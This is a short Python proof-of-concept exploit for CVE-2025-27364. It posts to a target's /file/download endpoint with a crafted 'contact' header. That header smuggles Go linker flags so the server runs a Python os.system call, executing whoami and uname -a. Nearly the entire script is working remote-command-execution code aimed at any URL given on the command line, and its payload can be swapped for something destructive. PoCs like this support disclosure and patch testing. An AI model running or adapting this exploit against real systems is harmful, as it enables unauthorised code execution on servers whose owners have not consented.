#!/usr/bin/env python
# CVE-2025-27364 PoC
# Author: compsecdirect

import requests
import argparse

VULNERABLE_ENDPOINT = "/file/download"

# Argument parser setup
parser = argparse.ArgumentParser(description="Send a POST request with custom headers to exploit CVE-2025-27364.")
parser.add_argument("base_url", help="Base URL of the target (e.g., http://target.local)")

# Parse arguments
args = parser.parse_args()

# Construct full target URL
target_url = args.base_url.rstrip("/") + VULNERABLE_ENDPOINT

exploit = "aaaa -buildmode plugin -extld gcc -extldflags \
'-wrapper python3,-c,__import__(\"os\").system(\"echo;echo;echo;echo${IFS}PWNED${IFS}by${IFS}CompSec${IFS}Direct.;echo;echo${IFS}I${IFS}AM:;whoami;echo${IFS}System${IFS}is:;uname${IFS}-a;echo;echo;echo\")'"

# Headers
headers = {
    "file": "manx.go",
    "contact": exploit,
    "platform": "linux"
}

# Send the POST request
response = requests.post(target_url, headers=headers)

# Output the response
if response.status_code == 200:
    print(f"Target URL is vulnerable. Check the logs ;)")
    print(f"Status Code: {response.status_code}")
else:
    print(f"There is an issue with {target_url} check if the version is vulnerable.")
    print(f"Status Code: {response.status_code}")
    print(f"Response Body: {response.text}")

